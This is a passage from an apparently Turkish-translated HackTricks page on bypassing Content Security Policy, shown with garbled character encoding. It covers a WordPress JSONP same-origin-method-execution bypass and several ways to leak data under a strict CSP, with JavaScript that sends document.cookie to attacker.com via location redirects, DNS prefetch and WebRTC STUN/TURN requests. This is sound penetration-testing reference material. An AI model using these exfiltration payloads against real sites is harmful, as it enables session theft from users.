Bir saldÄ±rgan, bu uÃ§ noktayÄ± kÃ¶tÃ¼ye kullanarak WordPress'e karÅŸÄ± bir SOME saldÄ±rÄ±sÄ± **oluÅŸturabilir** ve bunu `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` iÃ§ine yerleÅŸtirebilir. Bu **script**, **'self'** tarafÄ±ndan **izin verildiÄŸi iÃ§in yÃ¼klenecektir**. AyrÄ±ca, WordPress yÃ¼klÃ¼ olduÄŸu iÃ§in bir saldÄ±rgan, bir kullanÄ±cÄ±ya daha fazla ayrÄ±calÄ±k vermek, yeni bir eklenti yÃ¼klemek iÃ§in CSP'yi **atlatan** **savunmasÄ±z** **geri Ã§aÄŸÄ±rma** uÃ§ noktasÄ± aracÄ±lÄ±ÄŸÄ±yla **SOME saldÄ±rÄ±sÄ±nÄ±** kÃ¶tÃ¼ye kullanabilir... Bu saldÄ±rÄ±yÄ± nasÄ±l gerÃ§ekleÅŸtireceÄŸiniz hakkÄ±nda daha fazla bilgi iÃ§in [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/) adresine bakÄ±n.

## CSP Veri SÄ±zdÄ±rma AtlatmalarÄ±

EÄŸer harici sunucularla **etkileÅŸimde bulunmanÄ±za izin vermeyen** sÄ±kÄ± bir CSP varsa, bilgileri sÄ±zdÄ±rmak iÃ§in her zaman yapabileceÄŸiniz bazÄ± ÅŸeyler vardÄ±r.

### Location

Sadece konumu gÃ¼ncelleyerek gizli bilgileri saldÄ±rganÄ±n sunucusuna gÃ¶nderebilirsiniz:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Meta etiketi

Meta etiketi enjekte ederek yÃ¶nlendirme yapabilirsiniz (bu sadece bir yÃ¶nlendirme, iÃ§eriÄŸi sÄ±zdÄ±rmaz).
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS Ã–n YÃ¼kleme

SayfalarÄ± daha hÄ±zlÄ± yÃ¼klemek iÃ§in tarayÄ±cÄ±lar, ana bilgisayar adlarÄ±nÄ± IP adreslerine Ã¶nceden Ã§Ã¶zÃ¼mleyip daha sonra kullanmak Ã¼zere Ã¶nbelleÄŸe alÄ±rlar.\
TarayÄ±cÄ±ya bir ana bilgisayar adÄ±nÄ± Ã¶nceden Ã§Ã¶zÃ¼mlemesi iÃ§in ÅŸu ÅŸekilde belirtebilirsiniz: `<link reol="dns-prefetch" href="something.com">`

Bu davranÄ±ÅŸÄ± istismar ederek, **DNS istekleri aracÄ±lÄ±ÄŸÄ±yla hassas bilgileri sÄ±zdÄ±rabilirsiniz**:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
BaÅŸka bir yÃ¶ntem:
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
Bu durumun Ã¶nÃ¼ne geÃ§mek iÃ§in sunucu HTTP baÅŸlÄ±ÄŸÄ±nÄ± gÃ¶nderebilir:
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
GÃ¶rÃ¼nÃ¼ÅŸe gÃ¶re, bu teknik baÅŸsÄ±z tarayÄ±cÄ±larda (botlar) Ã§alÄ±ÅŸmÄ±yor.
{% endhint %}

### WebRTC

BirkaÃ§ sayfada, **WebRTC'nin CSP'nin `connect-src` politikasÄ±nÄ± kontrol etmediÄŸini** okuyabilirsiniz.

AslÄ±nda, bir _DNS isteÄŸi_ kullanarak bilgileri _sÄ±zdÄ±rabilirsiniz_. Bu kodu kontrol edin:
```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```
BaÅŸka bir seÃ§enek:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
## Ã‡evrimiÃ§i CSP PolitikalarÄ±nÄ± Kontrol Etme

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Otomatik olarak CSP oluÅŸturma

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Referanslar

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)


â€‹

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve Ã¶dÃ¼l avcÄ±larÄ± ile iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Insights**\
Hacking'in heyecanÄ±nÄ± ve zorluklarÄ±nÄ± inceleyen iÃ§eriklerle etkileÅŸime geÃ§in

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
HÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nÄ± gerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle takip edin

**En Son Duyurular**\
Yeni Ã¶dÃ¼l avlarÄ± baÅŸlatma ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgi edinin

**Bize** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **katÄ±lÄ±n ve bugÃ¼n en iyi hackerlarla iÅŸbirliÄŸi yapmaya baÅŸlayÄ±n!**

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklam vermek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
* Hacking hilelerinizi gÃ¶ndererek HackTricks ve HackTricks Cloud github depolarÄ±na PR gÃ¶ndererek **hacking hilelerinizi paylaÅŸÄ±n**.

</details>
